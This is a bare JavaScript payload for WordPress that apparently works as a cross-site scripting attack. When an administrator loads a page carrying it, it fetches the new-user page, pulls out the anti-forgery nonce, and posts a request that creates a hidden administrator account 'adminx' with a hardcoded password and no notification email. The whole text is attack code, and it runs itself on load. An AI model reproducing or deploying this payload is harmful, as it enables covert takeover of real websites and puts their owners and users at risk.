function addAdminUser()
{
   var uri = “/wp-admin/user-new.php”;
   var username  = “adminx”;
   var email     = “plus1234%40somewhere.com”;
   var password  = “Sakadeliboyz”;

   xhr = new XMLHttpRequest();

   xhr.open(“GET”, uri, true);
   xhr.send(null);

   xhr.onreadystatechange = function()
 {
    if (xhr.readyState == XMLHttpRequest.DONE)
    {
       // Parse out the nonce
       var response = read_body(xhr);
       var noncePos = response.indexOf(‘name=”_wpnonce_create-user” value=”‘);
       console.log(“Nonce string index is: ” + noncePos);

       var nonceVal = response.substring(noncePos + 35, noncePos + 45);
       console.log(“Nonce substring is: ” + nonceVal);

// Now add the user using our nonce
       console.log(“Adding the user…”);
       xhr = new XMLHttpRequest();
       xhr.open(“POST”, uri);
       xhr.setRequestHeader(“Content-Type”, “application/x-www-form-urlencoded”);

       var body = “action=createuser&”;
       body += “_wpnonce_create-user=” + nonceVal + “&”;
       body += “_wp_http_referer=%2Fwp-admin%2Fuser-new.php&”;
       body += “user_login=” + username + “&”;
       body += “email=” + email + “&”;
       body += “first_name=&”;
       body += “last_name=&”;
       body += “uri=&”;
 
       body += “pass1=” + password + “&”;
       body += “pass1-text=” + password + “&”;
       body += “pass2=” + password + “&”;
       body += “pw_weak=on&”;

       body += “send_user_notification=0&”;
       body += “role=administrator&”;
       body += “ure_select_other_roles=&”;
       body += “createuser=Add+New+User”;

       xhr.send(body);
     }
   }
 }
 addAdminUser();